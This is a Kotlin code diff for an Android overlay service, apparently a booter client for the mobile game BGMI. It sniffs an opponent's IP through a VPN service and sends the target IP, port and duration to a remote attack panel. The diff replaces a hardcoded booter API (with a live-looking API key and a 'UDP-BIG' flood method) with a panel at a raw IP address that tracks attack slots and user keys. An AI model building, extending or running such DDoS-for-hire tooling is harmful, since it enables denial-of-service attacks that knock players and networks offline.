@@ -1,5 +1,6 @@
 package com.teamjadugar.apk
 
+import android.animation.ObjectAnimator
 import android.app.Service
 import android.content.Intent
 import android.graphics.PixelFormat
@@ -12,6 +13,7 @@ import android.view.MotionEvent
 import android.view.View
 import android.view.WindowManager
 import android.widget.*
+import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -31,7 +33,7 @@ class FloatingService : Service() {
     
     private var selectedTime = 120
     private var isAttacking = false
-    private var currentSlots = 0 
+    private var pulseAnimator: ObjectAnimator? = null
 
     companion object {
         var instance: FloatingService? = null
@@ -100,7 +102,8 @@ class FloatingService : Service() {
         etPortRef = etPort
         btnGetIpRef = btnGetIp
 
-        updateSlotsUI(currentSlots)
+        startButtonPulse() // Start Glowing Animation
+        updateSlotsFromPanel()
 
         floatingView.findViewById<TextView>(R.id.btnClose).setOnClickListener { stopSelf() }
         floatingView.findViewById<TextView>(R.id.btnMinimize).setOnClickListener {
@@ -125,15 +128,15 @@ class FloatingService : Service() {
         })
 
         btnGetIp.setOnClickListener {
-            tvLog.text = "SNIFFING..."
-            btnGetIp.text = "WAIT..."
+            tvLog.text = "> SNIFFING BGMI..."
+            btnGetIp.text = "SNIFFING..."
             btnGetIp.isEnabled = false
             startService(Intent(this, VpnService::class.java))
         }
 
         btnVpnOff.setOnClickListener {
             stopService(Intent(this, VpnService::class.java))
-            tvLog.text = ""
+            tvLog.text = "> VPN STOPPED"
             btnGetIp.text = "GET IP"
             btnGetIp.isEnabled = true
             btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1A102E"))
@@ -142,11 +145,7 @@ class FloatingService : Service() {
 
         btnAttack.setOnClickListener {
             if (isAttacking) {
-                Toast.makeText(this, "Attack already running! Wait for timer.", Toast.LENGTH_SHORT).show()
-                return@setOnClickListener
-            }
-            if (currentSlots >= 10) {
-                Toast.makeText(this, "⚠️ Slots Full! Please wait.", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Attack already running!", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
 
@@ -158,30 +157,55 @@ class FloatingService : Service() {
             }
 
             isAttacking = true
-            btnAttack.text = "LAUNCHED ✅"
-            btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
+            pulseAnimator?.cancel() // Stop pulse on attack
+            btnAttack.text = "LAUNCHING..."
             btnAttack.isEnabled = false
             
-            currentSlots++
-            updateSlotsUI(currentSlots)
-
             startAttackTimer(ip, port, selectedTime)
         }
 
         setupPanelDragAndResize()
     }
 
-    private fun updateSlotsUI(slots: Int) {
-        tvSlots.text = "SLOTS: $slots/10"
-        if (slots >= 10) {
-            tvSlots.setTextColor(android.graphics.Color.parseColor("#EF4444"))
-        } else {
-            tvSlots.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
+    private fun startButtonPulse() {
+        pulseAnimator = ObjectAnimator.ofFloat(btnAttack, "alpha", 1f, 0.6f, 1f).apply {
+            duration = 1000
+            repeatCount = ObjectAnimator.INFINITE
+            start()
         }
     }
 
+    private fun updateSlotsFromPanel() {
+        Thread {
+            try {
+                val panelUrl = "http://13.211.179.172:5000/connect/slots"
+                val url = URL(panelUrl)
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "GET"
+                conn.connectTimeout = 3000
+                conn.readTimeout = 3000
+                
+                if (conn.responseCode == 200) {
+                    val res = conn.inputStream.bufferedReader().readText()
+                    val json = JSONObject(res)
+                    val used = json.optInt("slots_used", 0)
+                    val total = json.optInt("slots_total", 10)
+                    
+                    Handler(Looper.getMainLooper()).post {
+                        tvSlots.text = "SLOTS: $used/$total"
+                        if (used >= total) {
+                            tvSlots.setTextColor(android.graphics.Color.parseColor("#EF4444"))
+                        } else {
+                            tvSlots.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
+                        }
+                    }
+                }
+            } catch (e: Exception) {}
+        }.start()
+    }
+
     private fun startAttackTimer(ip: String, port: String, time: Int) {
-        executeAttack(ip, port, time)
+        executeAttackToPanel(ip, port, time)
         
         Thread {
             try {
@@ -202,14 +226,11 @@ class FloatingService : Service() {
                     tvBubbleTimer.visibility = View.GONE
                     
                     btnAttack.text = "LAUNCH ATTACK 🚀"
-                    btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#D946EF"))
                     btnAttack.isEnabled = true
                     isAttacking = false
+                    startButtonPulse() // Restart pulse when attack ends
                     
-                    if (currentSlots > 0) {
-                        currentSlots--
-                        updateSlotsUI(currentSlots)
-                    }
+                    updateSlotsFromPanel()
                 }
             } catch (e: InterruptedException) {}
         }.start()
@@ -256,7 +277,7 @@ class FloatingService : Service() {
                 MotionEvent.ACTION_MOVE -> {
                     val newWidth = initialWidth + (event.rawX - initialTouchX).toInt()
                     val newHeight = initialHeight + (event.rawY - initialTouchY).toInt()
-                    paramsPanel.width = if (newWidth > 280) newWidth else 280
+                    paramsPanel.width = if (newWidth > 300) newWidth else 300
                     paramsPanel.height = if (newHeight > 200) newHeight else WindowManager.LayoutParams.WRAP_CONTENT
                     windowManager.updateViewLayout(floatingView, paramsPanel)
                     true
@@ -303,57 +324,60 @@ class FloatingService : Service() {
         }
     }
 
-    private fun executeAttack(ip: String, port: String, time: Int) {
+    private fun executeAttackToPanel(ip: String, port: String, time: Int) {
         Thread {
             var conn: HttpURLConnection? = null
             try {
-                val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
-                val apiKey = "sp_live_065a318078f3efc19e0be720102e9a7e"
-
-                var finalIp = ip
-                var finalPort = port
-                if (ip.contains(":")) {
-                    val parts = ip.split(":")
-                    finalIp = parts[0]
-                    finalPort = parts[1]
-                }
-
+                val apiUrl = "http://13.211.179.172:5000/connect/action" 
                 val url = URL(apiUrl)
                 conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("x-api-key", apiKey)
                 conn.doOutput = true
-                conn.connectTimeout = 8000
-                conn.readTimeout = 8000
+                conn.connectTimeout = 10000
+                conn.readTimeout = 10000
 
-                val jsonInput = """{"target":"$finalIp","port":$finalPort,"duration":$time,"method":"UDP-BIG"}"""
+                val key = MainActivity.userKey 
+
+                val jsonInput = """{"key": "$key", "ip": "$ip", "port": "$port", "time": "$time"}"""
                 conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }
 
                 val responseCode = conn.responseCode
-                
-                Handler(Looper.getMainLooper()).post {
-                    if (responseCode !in 200..201) {
+                if (responseCode == 200) {
+                    val response = conn.inputStream.bufferedReader().readText()
+                    val json = JSONObject(response)
+                    
+                    Handler(Looper.getMainLooper()).post {
+                        if (json.getBoolean("valid") && json.getBoolean("attack")) {
+                            btnAttack.text = "LAUNCHED ✅"
+                            btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
+                            tvLog.text = "> ATTACK STARTED"
+                        } else {
+                            val msg = json.optString("msg", "Attack Failed")
+                            btnAttack.text = "LAUNCH ATTACK 🚀"
+                            btnAttack.isEnabled = true
+                            isAttacking = false
+                            startButtonPulse() 
+                            tvLog.text = "> $msg"
+                            Toast.makeText(this@FloatingService, msg, Toast.LENGTH_LONG).show()
+                        }
+                    }
+                } else {
+                    Handler(Looper.getMainLooper()).post {
                         btnAttack.text = "LAUNCH ATTACK 🚀"
-                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#D946EF"))
                         btnAttack.isEnabled = true
                         isAttacking = false
-                        if (currentSlots > 0) { currentSlots--; updateSlotsUI(currentSlots) }
-                        tvLog.text = ""
-                        tvBubbleTimer.visibility = View.GONE
-                        Toast.makeText(this@FloatingService, "API Error!", Toast.LENGTH_SHORT).show()
+                        startButtonPulse() 
+                        tvLog.text = "> NETWORK ERROR"
                     }
                 }
             } catch (e: Exception) {
                 Handler(Looper.getMainLooper()).post {
                     btnAttack.text = "LAUNCH ATTACK 🚀"
-                    btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#D946EF"))
                     btnAttack.isEnabled = true
                     isAttacking = false
-                    if (currentSlots > 0) { currentSlots--; updateSlotsUI(currentSlots) }
-                    tvLog.text = ""
-                    tvBubbleTimer.visibility = View.GONE
-                    Toast.makeText(this@FloatingService, "Network Fail!", Toast.LENGTH_SHORT).show()
+                    startButtonPulse() 
+                    tvLog.text = "> CONNECTION FAIL"
                 }
             } finally {
                 conn?.disconnect()
@@ -363,6 +387,7 @@ class FloatingService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        pulseAnimator?.cancel()
         try {
             if (::floatingView.isInitialized) windowManager.removeView(floatingView)
             if (::bubbleView.isInitialized) windowManager.removeView(bubbleView)
